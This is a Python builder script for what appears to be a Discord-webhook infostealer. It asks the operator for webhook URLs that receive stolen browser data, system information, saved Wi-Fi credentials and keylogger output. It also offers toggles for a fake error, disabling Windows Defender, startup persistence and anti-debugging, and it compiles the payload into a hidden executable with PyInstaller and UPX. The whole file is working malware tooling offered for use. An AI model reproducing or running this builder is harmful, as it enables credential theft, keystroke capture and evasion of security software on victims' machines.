import subprocess
#import os
from colorama import Fore, Style
import sys


def build(icon, file, upx):
    print(Fore.BLUE +"[+] Building exe..."+ Style.RESET_ALL)
    if upx:
        try:
            subprocess.run(f"pyinstaller --onefile -w --clean -i {icon} --upx-dir C:/UPX {file}", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True) #subprocess.run(f"pyinstaller --onefile -w -i {icon}  --upx-dir C:\UPX {file}", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)
            print(Fore.GREEN +"[+] Building exe successfully finished!"+ Style.RESET_ALL)
            print(Fore.GREEN +"[+] All done!"+ Style.RESET_ALL)
        except:
            print(Fore.RED +"[-] Please make sure you have pyinstaller and UPX installed under C:/UPX!"+ Style.RESET_ALL)
            sys.exit(1)
    else:
        try:
            subprocess.run(f"pyinstaller --onefile --clean -w -i {icon} {file}", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True) #subprocess.run(f"pyinstaller --onefile -w -i {icon}  --upx-dir C:\UPX {file}", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)
            print(Fore.GREEN +"[+] Building exe successfully finished!"+ Style.RESET_ALL)
            print(Fore.GREEN +"[+] All done!"+ Style.RESET_ALL)
        except:
            print(Fore.RED +"[-] Please make sure you have pyinstaller installed!"+ Style.RESET_ALL)
            sys.exit(1)


def convert(value, name):
    if value.lower() == "y":
        return True
    elif value.lower() == "n":
        return False
    else:
        print(Fore.RED +f"[-] Choice for {name} is invalid, please enter 'y' for yes or 'n' for no!"+ Style.RESET_ALL)
        sys.exit(0)

def config(webhook, webhook_keylogger, interval, startup, keylogger, error, antidebug, defender):    
    config = f"WEBHOOK = '{webhook}'\nWEBHOOK_KEYLOGGER = '{webhook_keylogger}'\nINTERVAL = {interval}\nSTARTUP = {startup}\nKEYLOGGER = {keylogger}\nERROR = {error}\nANTIDEBUG = {antidebug}\nDEFENDER = {defender}"
    
    with open("config.py", "w") as f:
        f.write(config)

def validate(url):
    if url.startswith("https://discord.com/api/webhooks/"):
        return
    else:
        print(Fore.RED +"Webhook is invalid!"+ Style.RESET_ALL)
        sys.exit(0)


webhook = input("[?] Enter webhook URL for browser info, system info and saved wifi: ")
validate(webhook)
error = input("[?] Enable fake error? [Y/n]: ")
defender = input("[?] Enable defender disabler? [Y/n]: ")
startup  = input("[?] Enable startup? [Y/n]: ")
antidebug = input("[?] Enable antidebug? [Y/n]: ")
keylogger = input("[?] Enable keylogger? [Y/n]: ")
if keylogger.lower() == "y":
    keylogger_webhook = input("[?] Enter webhook URL for keylogger: ")
    validate(keylogger_webhook)
    interval = input("[?] Enter interval for keylogger sending (in secondes): ")
else:
    keylogger_webhook = "null"
    interval = 0
    
config(webhook, keylogger_webhook, interval, convert(startup, "startup"), convert(keylogger, "keylogger"), convert(error, "error"), convert(antidebug, "antidebug"), convert(defender, "defender disabler"))


choice = input("> Do you want to edit building options[Y/n]: ")
if choice.lower() == "y":
    upx = input("[?] Use UPX? [Y/n]: ")
    if upx.lower() == "y":
        upx = True
    elif upx.lower() == "n":
        upx = False
    else:
        print(Fore.RED +"[-] Your choice was invalid, please enter 'y' for yes or 'n' for no!"+ Style.RESET_ALL)
        
    icon = input("[?] Enter icon file: ")
    file = input("[?] Enter python source file: ")
    build(icon, file, upx)
elif choice.lower() == "n":
    build("icon.ico", "src\main.py", True)
else:
    print(Fore.RED +"[-] Your choice was invalid, please enter 'y' for yes or 'n' for no!"+ Style.RESET_ALL)
    